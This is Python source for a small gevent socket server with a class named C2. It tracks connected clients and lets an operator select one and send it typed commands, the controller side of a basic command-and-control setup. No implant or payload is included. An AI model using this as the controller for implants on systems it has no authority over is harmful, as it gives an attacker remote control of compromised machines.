import gevent
from gevent.server import StreamServer
from gevent.lock import Semaphore
import threading

class Serversck:
    def __init__(self, host='127.0.0.1', port=8000):
        self.host = host
        self.port = port
        self.server = StreamServer((self.host, self.port), self.handle)
        self.clients = []
        self.clients_lock = Semaphore()
        self.on_connect_callbacks = []
        self.on_disconnect_callbacks = []
        self.on_data_callbacks = []

    def list_connected_clients_list(self):
        with self.clients_lock:
            return self.clients

    def list_connected_clients(self):
        print("clients conectados:")
        with self.clients_lock:
            for index, client in enumerate(self.clients):
                print(f"{index}: {client.getpeername()}")

    def handle(self, socket, address):
        with self.clients_lock:
            self.clients.append(socket)
        self.on_connect(socket, address)

        try:
            while True:
                data = socket.recv(1024)
                if not data:
                    break
                self.on_data(socket, data)
        except Exception as e:
            print(f"Error: {e}")
        finally:
            self.on_disconnect(socket, address)
            with self.clients_lock:
                self.clients.remove(socket)

    def serve_forever(self):
        print(f"Server started on {self.host}:{self.port}")
        self.server.serve_forever()

    def on_connect(self, socket, address):
        print(f"New connection from {address}")
        for callback in self.on_connect_callbacks:
            callback(socket, address)

    def on_disconnect(self, socket, address):
        print(f"Connection closed with {address}")
        for callback in self.on_disconnect_callbacks:
            callback(socket, address)

    def on_data(self, socket, data):
        print(f"Received data: {data.decode()}")
        for callback in self.on_data_callbacks:
            callback(socket, data)

    def add_on_connect_callback(self, callback):
        self.on_connect_callbacks.append(callback)

    def add_on_disconnect_callback(self, callback):
        self.on_disconnect_callbacks.append(callback)

    def add_on_data_callback(self, callback):
        self.on_data_callbacks.append(callback)

class C2:
    def __init__(self):
        self.selected_client = None
        self.client_index = None

    def select_client(self, server):
        server.list_connected_clients()
        try:
            client_index = int(input('Select client index: '))
            with server.clients_lock:
                self.selected_client = server.clients[client_index]
        except (ValueError, IndexError):
            print("Invalid client index")
            self.selected_client = None

    def broadcast_message(self, server):
        waiting_for_client = False
        while True:
            if self.selected_client is not None:
                cmd = input('Enter command: ')
                if cmd == 'select':
                    self.select_client(server)
                else:
                    cmd = cmd.encode()
                    try:
                        self.selected_client.sendall(cmd)
                    except Exception as e:
                        print(f"Error sending message: {e}")
                        self.selected_client = None
                        waiting_for_client = True
            else:
                if not waiting_for_client:
                    print("No clients connected")
                    waiting_for_client = True
                if server.list_connected_clients_list():
                    self.select_client(server)
                    waiting_for_client = False

if __name__ == "__main__":
    server = Serversck()
    c2app = C2()
    t = threading.Thread(target=c2app.broadcast_message, args=(server,))
    t.start()
    server.serve_forever()
